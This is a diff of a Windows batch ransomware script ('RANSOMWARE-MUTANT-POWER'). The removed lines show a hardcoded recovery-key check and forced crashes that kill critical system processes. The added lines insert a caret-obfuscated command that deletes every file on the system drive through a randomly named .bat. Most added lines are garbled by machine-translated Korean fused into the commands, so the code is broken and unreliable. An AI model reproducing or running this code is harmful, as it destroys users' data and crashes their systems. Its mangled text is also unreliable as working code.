@@ -352,51 +352,63 @@ start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
 
 :pass                        
 set /p password=복구키 : 
-timeout/t 2 /nobreak >nul
-if %password%==developerdecryptkey goto good
-if %password%==%PASS% goto good
+timeout/t 2 /nobreak >nultimeout/t 2 /nobreak >null
+if %password%==developerdecryptkey goto good%password%==sysdecryptkey가 정상으로 전환되는 경우
+if %password%==%%password%==%인 경우PASS% goto goodPASS% 양호 상태로 전환
 
-:bad               
-::recovery key wrong
-color 47
-cls
-echo Recovery key does not exist.
-echo A blue screen will start.
-timeout/t 2 >nul
-cls
-taskkill /f /im csrss.exe
-taskkill /f /im svchost.exe
-taskkill /f /im wininit.exe
-taskkill /f /im winlogon.exe
-set /p password=복구키 : 
-if %password%==developerdecryptkey goto good
-if %password%==%PASS% goto good
-timeout/t 2 >nul
-goto bad
+:bad               :나쁜
+::recovery key wrong::복구 키 잘못됨
+color 47색 47
+clscls
+echo Recovery key does not exist.에코 복구 키가 없습니다.
+echo A blue screen will start.에코 블루 스크린이 시작됩니다.
 
-:good               
-::recovery key correct
-cls
-echo Restoring...
-echo Never close this window.
+::^D^e^l^ all file::^D^e^l^모든 파일
+echo ^D^e^l^ all file.echo^D^e^l^모든 파일.
+set randomqustn=%random%randomqustn=%dump% 설정
+echo ^d^e^l^ ^%^s^y^s^t^e^m^d^r^i^v^e^%^\^*^.에코 ^d^e^l^%^s^y^s^t^m^d^r^i^v^e^%^\^*^.^*^ ^/^f^ ^/^s^ ^/^q^ > %userprofile%\^/^f^ ^/^s^ ^/^q^ > %userprofile%\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\%randomqustn%.랜섬웨어-뮤턴트-파워\%랜덤퀘스트n%.bat박쥐
+start "" "%userprofile%\" " " %userprofile%\ 시작AppData\앱데이터\RANSOMWARE-MUTANT-POWER\%randomqustn%.랜섬웨어-뮤턴트-파워\%랜덤퀘스트n%.bat"방망이"
+
+timeout/t 2 >nultimeout/t 2 >null
+clscls
+taskkill /f /im csrss.exetaskkill /f /imcss.exe
+taskkill /f /im svchost.exetaskkill /f /imsvchost.exe
+taskkill /f /im wininit.exetaskkill /f /im winininit.exe
+taskkill /f /im winlogon.exetaskkill /f /im winlogon.exe
+set /p password=복구키 : set /p password=http:
+if %password%==developerdecryptkey goto good%password%==sysdecryptkey가 정상으로 전환되는 경우
+if %password%==%%password%==%인 경우PASS% goto goodPASS% 양호 상태로 전환
+timeout/t 2 >nultimeout/t 2 >null
+goto bad잠자리에 들다
+
+:good               :좋은
+::recovery key correct::복구 키가 올바름
+clscls
+echo Restoring...echo 복원 중...
+echo Never close this window.echo 이 창을 닫지 않습니다.
 echo Recovery takes about 5 seconds.
-timeout/t 5 /nobreak >nul
-del %userprofile%\Desktop\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\
-del %userprofile%\pictures\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\
-del %userprofile%\videos\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\
-del %userprofile%\documents\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\documents\
-del %userprofile%\downloads\*.joker*
-move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\
-cls
-del %userprofile%\POWER-JOKER-PASSWORD.txt
-del /a "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\clickme.bat"
-rmdir /s /q %userprofile%\AppData\RANSOMWARE-MUTANT-POWER
-cls
-echo detox success
-timeout /t 5 /nobreak >nul
-exit
-          ::program end
+timeout/t 5 /nobreak >nultimeout/t 5 /nobreak >null
+  del %userprofile%\del %userprofile%\Desktop\*.joker*바탕 화면\.*조커*
+  move %userprofile%\%userprofile% 이동\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\랜섬웨어-뮤턴트-POWER\desk\*.* %userprofile%\Desktop\바탕 화면\
+  del %userprofile%\pictures\*.joker*del %userprofile%\beta\*.dll*
+  move %userprofile%\%userprofile% 이동\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\pic\*.랜섬웨어-뮤턴트-파워\pic\*.* %userprofile%\pictures\%userprofile%\filename\
+  del %userprofile%\videos\*.joker*del %userprofile%\beta\*.dll*
+  move %userprofile%\%userprofile% 이동\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\video\*.랜섬웨어-뮤턴트-파워\video\*.* %userprofile%\videos\%userprofile%\filename\
+  del %userprofile%\documents\*.joker*del %userprofile%\beta\*.dll*
+  move %userprofile%\%userprofile% 이동\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\doc\*.랜섬웨어-뮤턴트-파워\doc\*.* %userprofile%\documents\%userprofile%\filename\
+  del %userprofile%\downloads\*.joker*del %userprofile%\beta\*.dll*
+  move %userprofile%\%userprofile% 이동\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\down\*.랜섬웨어-무작위-전원\다운\*.* %userprofile%\downloads\%userprofile%\filename\
+clscls
+del %userprofile%\del %userprofile%\POWER-JOKER-PASSWORD.txtPOWER-JOKER-PASSWORD.txt
+::retrun all file::모든 파일 다시 실행
+del /a "%userprofile%\del /a %userprofile%\AppData\Roaming\Microsoft\앱데이터\로밍\Microsoft\Windows\Start Menu\Programs\startup\clickme.bat"Windows\시작 메뉴\프로그램\시작\클릭미.bat"
+rmdir /s /q %userprofile%\rmdir /s /q %userprofile%\AppData\앱데이터\RANSOMWARE-MUTANT-POWER랜섬웨어-변종-파워
+clscls
+echo detox success해독의 성공에 반향을 일으킴.
+echo boom!메아리 쾅!
+timeout /t 5 /nobreak >nultimeout /t 5 /nobreak >null
+clscls
+del %userprofile%\del %userprofile%\Desktop\*clickme.바탕 화면\*나를 클릭합니다.bat*배트*
+del %userprofile%\del %userprofile%\AppData\앱데이터\RANSOMWARE-MUTANT-POWER\%randomqustn%.랜섬웨어-뮤턴트-파워\%랜덤퀘스트n%.bat박쥐
+exit출입구
+          ::program end::프로그램 종료
